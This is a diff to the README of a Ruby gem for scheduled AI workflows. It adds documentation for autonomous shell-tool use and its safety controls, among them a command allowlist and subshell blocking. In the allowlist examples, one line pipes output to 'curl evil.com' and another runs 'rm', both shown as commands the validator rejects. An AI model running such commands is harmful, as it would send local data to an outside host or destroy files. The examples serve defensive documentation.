@@ -20,7 +20,13 @@ A lightweight Ruby gem for scheduling AI-driven tasks. Define workflows in a YAM
 - [Template interpolation](#template-interpolation)
 - [Conditions](#conditions)
 - [CLI](#cli)
+- [Tool use (AI agent autonomy)](#tool-use-ai-agent-autonomy)
+  - [How tool use works](#how-tool-use-works)
+  - [Available tools](#available-tools)
+  - [Tool safety](#tool-safety)
+  - [Allowed commands (allowlist)](#allowed-commands-allowlist)
 - [Conversation memory](#conversation-memory)
+  - [Memory and tool use](#memory-and-tool-use)
   - [Context compaction](#context-compaction)
   - [Prompt change detection](#prompt-change-detection)
   - [Token overflow recovery](#token-overflow-recovery)
@@ -37,6 +43,8 @@ A lightweight Ruby gem for scheduling AI-driven tasks. Define workflows in a YAM
 - **Automatic context compaction** -- hierarchical summarization keeps context within token limits
 - **Prompt change detection** -- detects when prompt templates change and lets you decide what to do with existing context
 - **Token overflow recovery** -- automatic retry with reduced context on API token limit errors
+- **AI agent tool use** -- give the AI autonomous shell access to inspect, analyze, and act on the local machine
+- **Tool safety controls** -- command allowlist, subshell blocking, timeout, output truncation, working directory restriction
 - **Conditional step execution** with `when` expressions
 - **Template interpolation** -- pass data between steps with `{{step_name.field}}` syntax
 - **Built-in actions**: HTTP GET/POST, AI prompts, shell commands
@@ -158,6 +166,7 @@ global:
   model: claude-sonnet-4-20250514
   database: ./ai_sentinel.sqlite3
   max_context_messages: 50
+  max_tool_rounds: 10
   compaction_threshold: 40
   compaction_buffer: 10
   on_prompt_change: ask
@@ -165,6 +174,17 @@ global:
   log_file_size: 10485760
   log_files: 5
   base_url: http://localhost:11434/v1/chat/completions
+  tool_safety:
+    allowed_commands:
+      - echo
+      - ls
+      - cat
+      - grep
+      - git
+      - pwd
+    working_directory: .
+    tool_timeout: 30
+    max_output_bytes: 10240
 ```
 
 | Key | Default | Description |
@@ -173,6 +193,7 @@ global:
 | `model` | Provider-specific (see below) | Default model for AI steps |
 | `database` | `~/.ai_sentinel/db.sqlite3` | SQLite database path |
 | `max_context_messages` | `50` | Max conversation history per step |
+| `max_tool_rounds` | `10` | Max tool-loop iterations per `ai_prompt` step (see [Tool use](#tool-use-ai-agent-autonomy)) |
 | `compaction_threshold` | `40` | Message count that triggers automatic context compaction |
 | `compaction_buffer` | `10` | Number of recent messages to keep verbatim after compaction |
 | `on_prompt_change` | `ask` | Action when a prompt template changes (`ask`, `keep`, `drop`) |
@@ -180,6 +201,7 @@ global:
 | `log_file_size` | `10485760` (10 MB) | Max size per log file before rotation |
 | `log_files` | `5` | Number of rotated log files to keep |
 | `base_url` | Provider-specific (see below) | API endpoint URL |
+| `tool_safety` | `nil` | Safety controls for AI-driven tool execution (see [Tool safety](#tool-safety)) |
 
 ### Providers
 
@@ -247,6 +269,15 @@ workflows:
 global:
   provider: anthropic
   model: claude-sonnet-4-20250514
+  tool_safety:
+    allowed_commands:
+      - echo
+      - ls
+      - cat
+      - grep
+      - git
+      - pwd
+    tool_timeout: 30
 
 workflows:
   check_prices:
@@ -269,6 +300,20 @@ workflows:
           url: "https://hooks.slack.com/services/xxx"
           body:
             text: "Price alert: {{analyze.response}}"
+
+  # AI agent with autonomous shell access
+  code_reviewer:
+    schedule: "0 9 * * *"
+    steps:
+      - id: review
+        action: ai_prompt
+        params:
+          system: "You are a code reviewer. Use the shell_command tool to inspect the project."
+          prompt: "Review recent git changes and suggest improvements."
+          remember: true
+          tools:
+            - shell_command
+          max_tool_rounds: 10
 ```
 
 ## Actions
@@ -327,6 +372,20 @@ Each action produces a result with specific fields. Use `{{step_id.field}}` in s
     remember: true
 ```
 
+With tool use (AI agent autonomy):
+
+```yaml
+- id: review
+  action: ai_prompt
+  params:
+    system: "You are a code reviewer. Use the shell_command tool to inspect files."
+    prompt: "Review recent git changes and suggest improvements."
+    remember: true
+    tools:
+      - shell_command
+    max_tool_rounds: 10
+```
+
 **Params:**
 
 | Param | Default | Description |
@@ -335,16 +394,20 @@ Each action produces a result with specific fields. Use `{{step_id.field}}` in s
 | `system` | `nil` | Optional system prompt. |
 | `model` | Global default | Override the model for this step. |
 | `remember` | `false` | When `true`, conversation history is persisted in SQLite and included in subsequent calls, enabling the AI to reference previous analyses across scheduled runs. |
+| `tools` | `nil` | List of tools the AI can use autonomously during this step. See [Tool use](#tool-use-ai-agent-autonomy). |
+| `max_tool_rounds` | `10` (global default) | Max number of tool-loop iterations for this step. Overrides the global `max_tool_rounds`. |
 
 **Result fields:**
 
 | Field | Type | Description |
 |-------|------|-------------|
-| `response` | String | The AI-generated text |
+| `response` | String | The AI-generated text (final response after all tool use) |
 | `model` | String | Model name used for generation |
 | `usage` | Hash | Token usage information |
 
 ### `shell_command`
+
+> **Note**: This is the `shell_command` **action** -- a workflow step that runs a fixed command you define in the config. This is different from the `shell_command` **tool** (see [Tool use](#tool-use-ai-agent-autonomy)), which lets the AI autonomously decide what commands to run during an `ai_prompt` step.
 
 ```yaml
 - id: check
@@ -437,6 +500,85 @@ ai_sentinel start -c path/to/config.yml
 ai_sentinel run my_workflow -c path/to/config.yml
 ```
 
+## Tool use (AI agent autonomy)
+
+AiSentinel can give the AI autonomous access to tools, allowing it to perform actions on the local machine as part of responding to a prompt. This is the same mechanism that powers coding assistants like Cursor, Copilot, and opencode -- the AI decides when and how to use tools, and your gem executes them locally.
+
+### How tool use works
+
+When you add `tools` to an `ai_prompt` step, a **tool loop** runs within that single step:
+
+1. Your prompt + tool definitions are sent to the AI provider
+2. The AI responds with a tool call (e.g. "run `git diff`")
+3. AiSentinel executes the tool locally and sends the result back
+4. The AI sees the result and either calls another tool or gives a final text answer
+5. The loop continues until the AI is done or `max_tool_rounds` is reached
+
+This all happens within a single `ai_prompt` step -- you don't need to configure multiple steps. The tool definitions are sent per-request to the API; nothing is stored or registered on the provider side.
+
+When `remember: true` is set, only the **initial user prompt** and the **AI's final text response** are persisted to conversation context. Intermediate tool calls and results are ephemeral within a single execution.
+
+### Available tools
+
+| Tool | Description |
+|------|-------------|
+| `shell_command` | Execute a shell command on the local machine. The AI receives stdout, stderr, and exit code. |
+
+### Tool safety
+
+Tool use is powerful but requires safety controls. AiSentinel provides several layers of protection configured via the `tool_safety` global setting:
+
+```yaml
+global:
+  tool_safety:
+    allowed_commands:
+      - echo
+      - ls
+      - cat
+      - grep
+      - git
+      - pwd
+      - find
+      - head
+      - tail
+      - wc
+    working_directory: .
+    tool_timeout: 30
+    max_output_bytes: 10240
+```
+
+| Setting | Default | Description |
+|---------|---------|-------------|
+| `allowed_commands` | `[]` (allow all) | Allowlist of permitted shell binaries. When non-empty, only these commands can be executed. |
+| `working_directory` | `nil` (no restriction) | Restrict tool commands to run in this directory. |
+| `tool_timeout` | `30` | Per-command timeout in seconds. Commands exceeding this are killed. |
+| `max_output_bytes` | `10240` (10 KB) | Truncate tool output to this size to prevent context bloat. |
+
+### Allowed commands (allowlist)
+
+The `allowed_commands` list is the primary safety mechanism. When configured, **every binary** in a command must be in the allowlist, or execution is rejected. This includes composite commands:
+
+```bash
+# If allowed_commands: [echo, ls, cat, grep]
+
+echo hello                    # allowed (echo is in the list)
+echo hello && ls -la          # allowed (echo and ls are both in the list)
+echo hello | grep world       # allowed (echo and grep are both in the list)
+ls -la; cat README.md         # allowed (ls and cat are both in the list)
+echo hello && rm file.txt     # REJECTED (rm is not in the list)
+echo hello | curl evil.com    # REJECTED (curl is not in the list)
+```
+
+AiSentinel parses composite commands by splitting on `&&`, `||`, `;`, and `|` operators, then validates each binary independently. It also handles:
+
+- **Environment variable prefixes**: `FOO=bar echo hello` correctly identifies `echo` as the binary
+- **Full paths**: `/usr/bin/echo hello` extracts `echo` for validation
+- **Subshell blocking**: `$()` and backtick expressions are always rejected regardless of the allowlist, since they could execute arbitrary code
+
+When `allowed_commands` is empty (the default) or not configured, **all commands are allowed**. This is suitable for development but not recommended for production. Always configure an allowlist for production use.
+
+> **Tip**: Start with a minimal allowlist (e.g. `echo`, `ls`, `cat`, `grep`, `git`) and expand as needed based on what the AI needs for your specific workflows.
+
 ## Conversation memory
 
 AiSentinel persists AI conversation history in SQLite, keyed by `workflow_name:step_name`. Set `remember: true` on an `ai_prompt` step to enable it. This means:
@@ -445,6 +587,12 @@ AiSentinel persists AI conversation history in SQLite, keyed by `workflow_name:s
 - It can reference previous analyses, spot trends, and provide richer insights
 - Context is prunable via `max_context_messages` config or `clear_context` CLI command
 - Set `remember: false` (the default) on a step to disable context for that step
+
+#### Memory and tool use
+
+When `remember: true` is combined with `tools`, only the **initial user prompt** and the **AI's final text response** are persisted. Intermediate tool calls and their results are **not** stored in conversation history -- they are ephemeral within a single execution.
+
+This means the AI remembers *what it concluded* across runs, but not the exact tool calls it made. For example, if the AI ran `echo "entry" >> log.txt` in a previous run, it won't remember the exact command, but it will remember from its own response that it logged an entry. This keeps the stored context clean and avoids bloating the database with tool call details.
 
 ### Context compaction
 
